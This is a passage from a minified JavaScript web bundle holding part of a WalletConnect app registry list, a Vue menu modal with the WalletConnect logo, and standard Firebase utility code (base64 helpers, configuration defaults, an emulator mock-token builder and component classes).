        src: "https://registry.walletconnect.com/api/v1/logo/lg/19c7ae6c2f2dad48a51c08b268544379afa37018b758311fa2a1fcc3ccb1a8fd",
        appName: "mStable",
        type: "App",
        href: "https://mstable.org/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/af724b42aa301b17617729f8b95dafd9fe1c72e9831b52177f279d6bd80f64b0",
        appName: "DAOhaus",
        type: "App",
        href: "https://daohaus.club/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/ad47668fc1e4327881f1f8b91f563d7a2c1d6e9596cd6b7d97b5791fe76964e9",
        appName: "Mask Network",
        type: "App",
        href: "https://mask.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/616a69d8d4a38e0235c32a50ff80f45cf99bf1f5788fb523ffa90f5b660bd975",
        appName: "Balancer",
        type: "App",
        href: "https://balancer.fi"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/30edc47c24de2727a86d50ba88c3516db28c0494a7c5f0b127e4329e855c6840",
        appName: "Autonomy",
        type: "App",
        href: "https://bitmark.com/autonomy"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/16cbec7a52204dbb75455f8ead438f7a8e9727956153626988000f313cfcef45",
        appName: "Yooshi",
        type: "App",
        href: "https://yooshi.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/a1ca5756d9a7b959a727aea7f3ae3d6223facb363403e9913e984f5868fede2b",
        appName: "Yup",
        type: "App",
        href: "https://yup.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/7dd97f0b25806117ae5d3000117e7e2e3a362548cebd92ce38357d6a09a39dc6",
        appName: "Metaspace",
        type: "App",
        href: "https://metaspace.fi/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/64af550970654673b979d3d8d725eb01863d9c187254c1a3d2e9a115f1d7e77e",
        appName: "CivTrade",
        type: "App",
        href: "https://civfund.org"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/3f6d608030d9bf5ea6128121bb0f8d5230ba21ea3fcd66fbf93e7fd1ba72d0e6",
        appName: "Unlock Protocol",
        type: "App",
        href: "https://unlock-protocol.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/5b06aef286ef1be1c9c9fb7a923949156aaf797ff3f91523f29e9cebb14d8458",
        appName: "Delta.theta",
        type: "App",
        href: "https://deltatheta.tech"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/7e94e75c90964a69ea375b92214f50c4223dfbfa4913a3733b615444b322f687",
        appName: "CoinStats",
        type: "App",
        href: "https://coinstats.app/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/2c68a247b6ebd732bf72dcd070330bd261a5e30df80fdabcac84c75eef29addd",
        appName: "Forest Knight",
        type: "App",
        href: "https://www.forestknight.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/fe9b597a44552ff0ef0ef68a7a6befa953ddc17ea1536c1e971ad2c85ac1e054",
        appName: "We-NFT.io",
        type: "App",
        href: "https://we-nft.io"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/895fee383e9ebb38411d04c8b64fddf354dcc601f958290286475f31ca9e2bd1",
        appName: "Quixotic",
        type: "App",
        href: "https://quixotic.io"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/45f048db8ca4d2bbf622e8474402f684ec0d2eb68baa4ec9e8001dd617d6285c",
        appName: "Graflr",
        type: "App",
        href: "https://www.graflr.com"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/b63b8e2a16539c4524ff27a1e166a4006538ddff647954e7bbfd6fa93c9d8198",
        appName: "StellarX",
        type: "App",
        href: "https://www.stellarx.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/c587c2601ccfc456cb7d4d9bb34f12f0fd11ad49faeeb4602860e239b5397843",
        appName: "Vision: Crypto Wallet",
        type: "App",
        href: "https://www.vision-crypto.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/1a8fed4bd55911a282854d7f1cdbca90319ad6dc1a9452dbf5eb3d39279e5c9f",
        appName: "DOMANI",
        type: "App",
        href: "https://domani.finance"
    }],
    b6 = {
        data() {
            return {
                showModal: !1
            }
        }
    },
    w6 = {
        class: ""
    },
    x6 = f("svg", {
        viewBox: "0 0 24 24",
        class: "w-6 h-6 fill-current"
    }, [f("path", {
        "fill-rule": "evenodd",
        d: "M4 5h16a1 1 0 0 1 0 2H4a1 1 0 1 1 0-2zm0 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2zm0 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2z"
    })], -1),
    _6 = [x6],
    C6 = {
        key: 0,
        class: "modal-masks"
    },
    S6 = {
        class: "modal-wrapper"
    },
    E6 = {
        class: "modal-container item-center rounded-lg p-5"
    },
    T6 = {
        class: "modal-header"
    },
    A6 = {
        class: "flex justify-between item-center"
    },
    L6 = vt('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1459 238" version="1.1" class="h-6"><title>WalletConnect&#39;s logo</title><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="walletconnect-logo-2"><path d="M526.766839,130.223822 L506.743339,202.279192 L485.915975,202.279192 L458,96.8269617 L480.873561,96.8269617 L497.462373,173.193962 L498.047001,173.193962 L517.778188,96.8269617 L536.413197,96.8269617 L556.144384,173.193962 L556.729011,173.193962 L573.390902,96.8269617 L596.264463,96.8269617 L568.27541,202.279192 L547.448046,202.279192 L527.424545,130.223822 L526.766839,130.223822 Z M626.665106,188.101969 C635.946072,188.101969 643.619311,182.036456 643.619311,173.559354 L643.619311,167.859233 L627.103577,168.882332 C619.138024,169.46696 614.607159,173.047805 614.607159,178.601768 C614.607159,184.448046 619.430338,188.101969 626.665106,188.101969 Z M619.649573,203.521526 C604.741566,203.521526 593.414403,193.875168 593.414403,179.771024 C593.414403,165.520722 604.376173,157.262855 623.888124,156.0936 L643.619311,154.924344 L643.619311,149.735773 C643.619311,142.427926 638.503818,138.189375 630.465187,138.189375 C622.499633,138.189375 617.457219,142.135612 616.434121,147.908811 L596.922169,147.908811 C597.726033,132.70849 610.660922,122.258269 631.415207,122.258269 C651.511786,122.258269 664.592832,132.635411 664.592832,148.420361 L664.592832,202.279192 L643.984703,202.279192 L643.984703,190.294323 L643.546233,190.294323 C639.161524,198.625269 629.442088,203.521526 619.649573,203.521526 Z M678.843133,202.279192 L678.843133,96.8269617 L700.182046,96.8269617 L700.182046,202.279192 L678.843133,202.279192 Z M715.090054,202.279192 L715.090054,96.8269617 L736.428966,96.8269617 L736.428966,202.279192 L715.090054,202.279192 Z M785.976168,138.043218 C776.622124,138.043218 769.898905,145.13183 769.168121,154.924344 L802.418824,154.924344 C801.980353,144.912594 795.476369,138.043218 785.976168,138.043218 Z M802.711138,178.309455 L822.296167,178.309455 C819.957656,193.655933 805.92659,203.959997 786.560796,203.959997 C762.444901,203.959997 747.975365,188.54044 747.975365,163.474525 C747.975365,138.481689 762.591058,122.258269 785.756933,122.258269 C808.557415,122.258269 822.953874,137.677826 822.953874,161.501407 L822.953874,168.00539 L768.948885,168.00539 L768.948885,169.320803 C768.948885,180.501809 776.037497,188.175048 786.926188,188.175048 C794.745585,188.175048 800.738019,184.301889 802.711138,178.309455 Z M839.615765,105.888692 L860.954677,105.888692 L860.954677,123.939074 L875.424214,123.939074 L875.424214,140.016337 L860.954677,140.016337 L860.954677,177.505591 C860.954677,183.498026 863.877816,186.348086 870.162565,186.348086 C872.062605,186.348086 874.035723,186.201929 875.351136,185.982694 L875.351136,201.694565 C873.158782,202.206114 869.504858,202.571506 865.193229,202.571506 C846.777455,202.571506 839.615765,196.432915 839.615765,181.159515 L839.615765,140.016337 L828.580916,140.016337 L828.580916,123.939074 L839.615765,123.939074 L839.615765,105.888692 Z M935.567794,204.106154 C904.874837,204.106154 885.6552,183.571104 885.6552,149.516538 C885.6552,115.53505 905.020994,95 935.567794,95 C960.926023,95 980.218739,111.077263 981.899543,134.681609 L960.414474,134.681609 C958.368277,121.74672 948.429605,113.269617 935.567794,113.269617 C918.905903,113.269617 908.163368,127.227605 908.163368,149.443459 C908.163368,171.951628 918.759746,185.836537 935.640873,185.836537 C948.721919,185.836537 958.149041,178.163298 960.487552,165.666879 L981.972622,165.666879 C979.487954,189.198146 961.437572,204.106154 935.567794,204.106154 Z M1029.69286,203.959997 C1006.01544,203.959997 990.888195,188.759676 990.888195,163.036055 C990.888195,137.677826 1006.23467,122.258269 1029.69286,122.258269 C1053.15105,122.258269 1068.49753,137.604747 1068.49753,163.036055 C1068.49753,188.832754 1053.37029,203.959997 1029.69286,203.959997 Z M1029.69286,187.663499 C1040.14308,187.663499 1046.79322,178.821004 1046.79322,163.109133 C1046.79322,147.543419 1040.07,138.554767 1029.69286,138.554767 C1019.31572,138.554767 1012.51942,147.543419 1012.51942,163.109133 C1012.51942,178.821004 1019.16956,187.663499 1029.69286,187.663499 Z M1079.4593,202.279192 L1079.4593,123.939074 L1100.06743,123.939074 L1100.06743,137.897061 L1100.5059,137.897061 C1104.67137,128.177625 1112.92924,122.477504 1124.98719,122.477504 C1142.37986,122.477504 1152.17238,133.439275 1152.17238,151.78197 L1152.17238,202.279192 L1130.83346,202.279192 L1130.83346,156.239757 C1130.83346,146.008771 1126.01028,140.162494 1116.437,140.162494 C1106.86373,140.162494 1100.79821,147.178027 1100.79821,157.335934 L1100.79821,202.279192 L1079.4593,202.279192 Z M1165.69189,202.279192 L1165.69189,123.939074 L1186.30002,123.939074 L1186.30002,137.897061 L1186.73849,137.897061 C1190.90396,128.177625 1199.16183,122.477504 1211.21978,122.477504 C1228.61245,122.477504 1238.40497,133.439275 1238.40497,151.78197 L1238.40497,202.279192 L1217.06606,202.279192 L1217.06606,156.239757 C1217.06606,146.008771 1212.24288,140.162494 1202.6696,140.162494 C1193.09632,140.162494 1187.03081,147.178027 1187.03081,157.335934 L1187.03081,202.279192 L1165.69189,202.279192 Z M1287.07523,138.043218 C1277.72119,138.043218 1270.99797,145.13183 1270.26718,154.924344 L1303.51789,154.924344 C1303.07941,144.912594 1296.57543,138.043218 1287.07523,138.043218 Z M1303.8102,178.309455 L1323.39523,178.309455 C1321.05672,193.655933 1307.02565,203.959997 1287.65986,203.959997 C1263.54396,203.959997 1249.07443,188.54044 1249.07443,163.474525 C1249.07443,138.481689 1263.69012,122.258269 1286.85599,122.258269 C1309.65648,122.258269 1324.05293,137.677826 1324.05293,161.501407 L1324.05293,168.00539 L1270.04795,168.00539 L1270.04795,169.320803 C1270.04795,180.501809 1277.13656,188.175048 1288.02525,188.175048 C1295.84465,188.175048 1301.83708,184.301889 1303.8102,178.309455 Z M1406.19313,153.097383 L1386.38887,153.097383 C1385.14653,144.839516 1379.66565,138.993238 1370.89623,138.993238 C1360.37293,138.993238 1353.79587,147.908811 1353.79587,163.036055 C1353.79587,178.455611 1360.37293,187.225028 1370.96931,187.225028 C1379.51949,187.225028 1385.07346,182.109535 1386.38887,173.559354 L1406.26621,173.559354 C1405.17004,192.048207 1391.3582,203.959997 1370.75008,203.959997 C1347.14573,203.959997 1332.16464,188.613519 1332.16464,163.036055 C1332.16464,137.897061 1347.14573,122.258269 1370.60392,122.258269 C1391.79668,122.258269 1405.24311,135.339315 1406.19313,153.097383 Z M1422.2704,105.888692 L1443.60931,105.888692 L1443.60931,123.939074 L1458.07885,123.939074 L1458.07885,140.016337 L1443.60931,140.016337 L1443.60931,177.505591 C1443.60931,183.498026 1446.53245,186.348086 1452.8172,186.348086 C1454.71724,186.348086 1456.69036,186.201929 1458.00577,185.982694 L1458.00577,201.694565 C1455.81341,202.206114 1452.15949,202.571506 1447.84786,202.571506 C1429.43209,202.571506 1422.2704,196.432915 1422.2704,181.159515 L1422.2704,140.016337 L1411.23555,140.016337 L1411.23555,123.939074 L1422.2704,123.939074 L1422.2704,105.888692 Z" id="WalletConnect" fill="#3999FB"></path><path d="M79.4992542,46.5389641 C142.715504,-15.3550143 245.209294,-15.3550143 308.425541,46.5389641 L316.033719,53.9880033 C319.194531,57.0827021 319.194531,62.1002006 316.033719,65.1949006 L290.007661,90.6765804 C288.427255,92.2239311 285.86491,92.2239311 284.284504,90.6765804 L273.814748,80.4258162 C229.713513,37.2470301 158.211283,37.2470301 114.110047,80.4258162 L102.897805,91.4035389 C101.317397,92.9508883 98.755052,92.9508883 97.1746471,91.4035389 L71.1485898,65.9218591 C67.9877774,62.8271591 67.9877774,57.8096606 71.1485898,54.7149619 L79.4992542,46.5389641 Z M362.249885,99.2377722 L385.413126,121.916595 C388.573922,125.01128 388.573941,130.028748 385.413167,133.123453 L280.968512,235.385079 C277.807722,238.479801 272.683033,238.479836 269.522198,235.385159 C269.522185,235.385146 269.52217,235.385132 269.522157,235.385118 L195.393696,162.807065 C194.603493,162.03339 193.32232,162.03339 192.532117,162.807065 C192.532112,162.80707 192.532108,162.807076 192.532103,162.807079 L118.40522,235.385079 C115.24444,238.479809 110.119749,238.479861 106.958905,235.385192 C106.958887,235.385174 106.958867,235.385155 106.958847,235.385136 L2.51128675,133.12215 C-0.649524409,130.027451 -0.649524409,125.009953 2.51128675,121.915254 L25.6745697,99.2364692 C28.8353808,96.1417705 33.9600712,96.1417705 37.1208837,99.2364692 L111.250424,171.815537 C112.040627,172.589212 113.321798,172.589212 114.112002,171.815537 C114.112014,171.815525 114.112024,171.815514 114.112036,171.815505 L188.237861,99.2364692 C191.398601,96.1416993 196.523291,96.1415832 199.684176,99.2362107 C199.68422,99.2362542 199.684263,99.2362977 199.684307,99.2363413 L273.813749,171.815505 C274.603952,172.589179 275.885125,172.589179 276.675327,171.815505 L350.803571,99.2377722 C353.964384,96.1430722 359.089073,96.1430722 362.249885,99.2377722 Z" id="WalletConnect" fill="#3B99FC" fill-rule="nonzero"></path></g></g></svg>', 1),
    I6 = f("svg", {
        stroke: "currentColor",
        fill: "none",
        "stroke-width": "0",
        viewBox: "0 0 24 24",
        "aria-hidden": "true",
        "font-size": "1.5rem",
        height: "1em",
        width: "1em",
        xmlns: "http://www.w3.org/2000/svg"
    }, [f("path", {
        "stroke-linecap": "round",
        "stroke-linejoin": "round",
        "stroke-width": "2",
        d: "M6 18L18 6M6 6l12 12"
    })], -1),
    N6 = [I6],
    P6 = vt('<div class="modal-body">Registry</div><div class="modal-body">Docs</div><div class="modal-footer"><button class="modal-default-button justify-center bg-sky-600 flex py-2 rounded-lg text-white w-full iteem-center"> Register </button><div class="item-center mx-auto text-center py-3"> Have an account? <a href="" class="text-blue-500"> Login</a></div></div>', 3);

function M6(e, t, s, n, i, r) {
    return O(), R(he, null, [f("div", w6, [su(e.$slots, "default"), f("button", {
        type: "button",
        onClick: t[0] || (t[0] = o => i.showModal = !i.showModal),
        class: "text-gray-500 hover:text-gray-600 focus:outline-none focus:text-gray-600",
        "aria-label": "toggle menu"
    }, _6)]), i.showModal ? (O(), R("div", C6, [f("div", S6, [f("div", E6, [f("div", T6, [f("div", A6, [L6, f("button", {
        onClick: t[1] || (t[1] = o => i.showModal = !1),
        class: "focus:bg-blue-100"
    }, N6)])]), P6])])])) : Ee("", !0)], 64)
}
const Ad = Se(b6, [
    ["render", M6]
]);
var El = {};
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const Ld = function(e) {
        const t = [];
        let s = 0;
        for (let n = 0; n < e.length; n++) {
            let i = e.charCodeAt(n);
            i < 128 ? t[s++] = i : i < 2048 ? (t[s++] = i >> 6 | 192, t[s++] = i & 63 | 128) : (i & 64512) === 55296 && n + 1 < e.length && (e.charCodeAt(n + 1) & 64512) === 56320 ? (i = 65536 + ((i & 1023) << 10) + (e.charCodeAt(++n) & 1023), t[s++] = i >> 18 | 240, t[s++] = i >> 12 & 63 | 128, t[s++] = i >> 6 & 63 | 128, t[s++] = i & 63 | 128) : (t[s++] = i >> 12 | 224, t[s++] = i >> 6 & 63 | 128, t[s++] = i & 63 | 128)
        }
        return t
    },
    k6 = function(e) {
        const t = [];
        let s = 0,
            n = 0;
        for (; s < e.length;) {
            const i = e[s++];
            if (i < 128) t[n++] = String.fromCharCode(i);
            else if (i > 191 && i < 224) {
                const r = e[s++];
                t[n++] = String.fromCharCode((i & 31) << 6 | r & 63)
            } else if (i > 239 && i < 365) {
                const r = e[s++],
                    o = e[s++],
                    l = e[s++],
                    a = ((i & 7) << 18 | (r & 63) << 12 | (o & 63) << 6 | l & 63) - 65536;
                t[n++] = String.fromCharCode(55296 + (a >> 10)), t[n++] = String.fromCharCode(56320 + (a & 1023))
            } else {
                const r = e[s++],
                    o = e[s++];
                t[n++] = String.fromCharCode((i & 15) << 12 | (r & 63) << 6 | o & 63)
            }
        }
        return t.join("")
    },
    Id = {
        byteToCharMap_: null,
        charToByteMap_: null,
        byteToCharMapWebSafe_: null,
        charToByteMapWebSafe_: null,
        ENCODED_VALS_BASE: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
        get ENCODED_VALS() {
            return this.ENCODED_VALS_BASE + "+/="
        },
        get ENCODED_VALS_WEBSAFE() {
            return this.ENCODED_VALS_BASE + "-_."
        },
        HAS_NATIVE_SUPPORT: typeof atob == "function",
        encodeByteArray(e, t) {
            if (!Array.isArray(e)) throw Error("encodeByteArray takes an array as a parameter");
            this.init_();
            const s = t ? this.byteToCharMapWebSafe_ : this.byteToCharMap_,
                n = [];
            for (let i = 0; i < e.length; i += 3) {
                const r = e[i],
                    o = i + 1 < e.length,
                    l = o ? e[i + 1] : 0,
                    a = i + 2 < e.length,
                    c = a ? e[i + 2] : 0,
                    d = r >> 2,
                    p = (r & 3) << 4 | l >> 4;
                let u = (l & 15) << 2 | c >> 6,
                    g = c & 63;
                a || (g = 64, o || (u = 64)), n.push(s[d], s[p], s[u], s[g])
            }
            return n.join("")
        },
        encodeString(e, t) {
            return this.HAS_NATIVE_SUPPORT && !t ? btoa(e) : this.encodeByteArray(Ld(e), t)
        },
        decodeString(e, t) {
            return this.HAS_NATIVE_SUPPORT && !t ? atob(e) : k6(this.decodeStringToByteArray(e, t))
        },
        decodeStringToByteArray(e, t) {
            this.init_();
            const s = t ? this.charToByteMapWebSafe_ : this.charToByteMap_,
                n = [];
            for (let i = 0; i < e.length;) {
                const r = s[e.charAt(i++)],
                    l = i < e.length ? s[e.charAt(i)] : 0;
                ++i;
                const c = i < e.length ? s[e.charAt(i)] : 64;
                ++i;
                const p = i < e.length ? s[e.charAt(i)] : 64;
                if (++i, r == null || l == null || c == null || p == null) throw new O6;
                const u = r << 2 | l >> 4;
                if (n.push(u), c !== 64) {
                    const g = l << 4 & 240 | c >> 2;
                    if (n.push(g), p !== 64) {
                        const w = c << 6 & 192 | p;
                        n.push(w)
                    }
                }
            }
            return n
        },
        init_() {
            if (!this.byteToCharMap_) {
                this.byteToCharMap_ = {}, this.charToByteMap_ = {}, this.byteToCharMapWebSafe_ = {}, this.charToByteMapWebSafe_ = {};
                for (let e = 0; e < this.ENCODED_VALS.length; e++) this.byteToCharMap_[e] = this.ENCODED_VALS.charAt(e), this.charToByteMap_[this.byteToCharMap_[e]] = e, this.byteToCharMapWebSafe_[e] = this.ENCODED_VALS_WEBSAFE.charAt(e), this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[e]] = e, e >= this.ENCODED_VALS_BASE.length && (this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(e)] = e, this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(e)] = e)
            }
        }
    };
class O6 extends Error {
    constructor() {
        super(...arguments), this.name = "DecodeBase64StringError"
    }
}
const $6 = function(e) {
        const t = Ld(e);
        return Id.encodeByteArray(t, !0)
    },
    ui = function(e) {
        return $6(e).replace(/\./g, "")
    },
    R6 = function(e) {
        try {
            return Id.decodeString(e, !0)
        } catch (t) {
            console.error("base64Decode failed: ", t)
        }
        return null
    };
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function D6() {
    if (typeof self < "u") return self;
    if (typeof window < "u") return window;
    if (typeof global < "u") return global;
    throw new Error("Unable to locate global object.")
}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const H6 = () => D6().__FIREBASE_DEFAULTS__,
    V6 = () => {
        if (typeof process > "u" || typeof El > "u") return;
        const e = El.__FIREBASE_DEFAULTS__;
        if (e) return JSON.parse(e)
    },
    j6 = () => {
        if (typeof document > "u") return;
        let e;
        try {
            e = document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)
        } catch {
            return
        }
        const t = e && R6(e[1]);
        return t && JSON.parse(t)
    },
    Nd = () => {
        try {
            return H6() || V6() || j6()
        } catch (e) {
            console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${e}`);
            return
        }
    },
    B6 = e => {
        var t, s;
        return (s = (t = Nd()) === null || t === void 0 ? void 0 : t.emulatorHosts) === null || s === void 0 ? void 0 : s[e]
    },
    F6 = e => {
        const t = B6(e);
        if (!t) return;
        const s = t.lastIndexOf(":");
        if (s <= 0 || s + 1 === t.length) throw new Error(`Invalid host ${t} with no separate hostname and port!`);
        const n = parseInt(t.substring(s + 1), 10);
        return t[0] === "[" ? [t.substring(1, s - 1), n] : [t.substring(0, s), n]
    },
    Pd = () => {
        var e;
        return (e = Nd()) === null || e === void 0 ? void 0 : e.config
    };
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class z6 {
    constructor() {
        this.reject = () => {}, this.resolve = () => {}, this.promise = new Promise((t, s) => {
            this.resolve = t, this.reject = s
        })
    }
    wrapCallback(t) {
        return (s, n) => {
            s ? this.reject(s) : this.resolve(n), typeof t == "function" && (this.promise.catch(() => {}), t.length === 1 ? t(s) : t(s, n))
        }
    }
}
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function U6(e, t) {
    if (e.uid) throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');
    const s = {
            alg: "none",
            type: "JWT"
        },
        n = t || "demo-project",
        i = e.iat || 0,
        r = e.sub || e.user_id;
    if (!r) throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");
    const o = Object.assign({
        iss: `https://securetoken.google.com/${n}`,
        aud: n,
        iat: i,
        exp: i + 3600,
        auth_time: i,
        sub: r,
        user_id: r,
        firebase: {
            sign_in_provider: "custom",
            identities: {}
        }
    }, e);
    return [ui(JSON.stringify(s)), ui(JSON.stringify(o)), ""].join(".")
}

function G6() {
    try {
        return typeof indexedDB == "object"
    } catch {
        return !1
    }
}

function W6() {
    return new Promise((e, t) => {
        try {
            let s = !0;
            const n = "validate-browser-context-for-indexeddb-analytics-module",
                i = self.indexedDB.open(n);
            i.onsuccess = () => {
                i.result.close(), s || self.indexedDB.deleteDatabase(n), e(!0)
            }, i.onupgradeneeded = () => {
                s = !1
            }, i.onerror = () => {
                var r;
                t(((r = i.error) === null || r === void 0 ? void 0 : r.message) || "")
            }
        } catch (s) {
            t(s)
        }
    })
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const q6 = "FirebaseError";
class Bs extends Error {
    constructor(t, s, n) {
        super(s), this.code = t, this.customData = n, this.name = q6, Object.setPrototypeOf(this, Bs.prototype), Error.captureStackTrace && Error.captureStackTrace(this, Md.prototype.create)
    }
}
class Md {
    constructor(t, s, n) {
        this.service = t, this.serviceName = s, this.errors = n
    }
    create(t, ...s) {
        const n = s[0] || {},
            i = `${this.service}/${t}`,
            r = this.errors[t],
            o = r ? K6(r, n) : "Error",
            l = `${this.serviceName}: ${o} (${i}).`;
        return new Bs(i, l, n)
    }
}

function K6(e, t) {
    return e.replace(Z6, (s, n) => {
        const i = t[n];
        return i != null ? String(i) : `<${n}?>`
    })
}
const Z6 = /\{\$([^}]+)}/g;

function Zr(e, t) {
    if (e === t) return !0;
    const s = Object.keys(e),
        n = Object.keys(t);
    for (const i of s) {
        if (!n.includes(i)) return !1;
        const r = e[i],
            o = t[i];
        if (Tl(r) && Tl(o)) {
            if (!Zr(r, o)) return !1
        } else if (r !== o) return !1
    }
    for (const i of n)
        if (!s.includes(i)) return !1;
    return !0
}

function Tl(e) {
    return e !== null && typeof e == "object"
}
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function X6(e) {
    return e && e._delegate ? e._delegate : e
}
class hn {
    constructor(t, s, n) {
        this.name = t, this.instanceFactory = s, this.type = n, this.multipleInstances = !1, this.serviceProps = {}, this.instantiationMode = "LAZY", this.onInstanceCreated = null
    }
    setInstantiationMode(t) {
        return this.instantiationMode = t, this
    }
    setMultipleInstances(t) {
        return this.multipleInstances = t, this
    }
    setServiceProps(t) {
        return this.serviceProps = t, this
    }
    setInstanceCreatedCallback(t) {
        return this.onInstanceCreated = t, this
    }
}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const ts = "[DEFAULT]";
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Y6 {
    constructor(t, s) {
        this.name = t, this.container = s, this.component = null, this.instances = new Map, this.instancesDeferred = new Map, this.instancesOptions = new Map, this.onInitCallbacks = new Map
    }
    get(t) {
        const s = this.normalizeInstanceIdentifier(t);
        if (!this.instancesDeferred.has(s)) {
            const n = new z6;
            if (this.instancesDeferred.set(s, n), this.isInitialized(s) || this.shouldAutoInitialize()) try {
                const i = this.getOrInitializeService({
                    instanceIdentifier: s
                });
                i && n.resolve(i)
            } catch {}
        }
        return this.instancesDeferred.get(s).promise
    }
    getImmediate(t) {
        var s;
        const n = this.normalizeInstanceIdentifier(t == null ? void 0 : t.identifier),
            i = (s = t == null ? void 0 : t.optional) !== null && s !== void 0 ? s : !1;
        if (this.isInitialized(n) || this.shouldAutoInitialize()) try {
            return this.getOrInitializeService({
                instanceIdentifier: n
            })
        } catch (r) {
            if (i) return null;
            throw r
        } else {
            if (i) return null;
            throw Error(`Service ${this.name} is not available`)
        }
    }
    getComponent() {
        return this.component
    }
    setComponent(t) {
        if (t.name !== this.name) throw Error(`Mismatching Component ${t.name} for Provider ${this.name}.`);
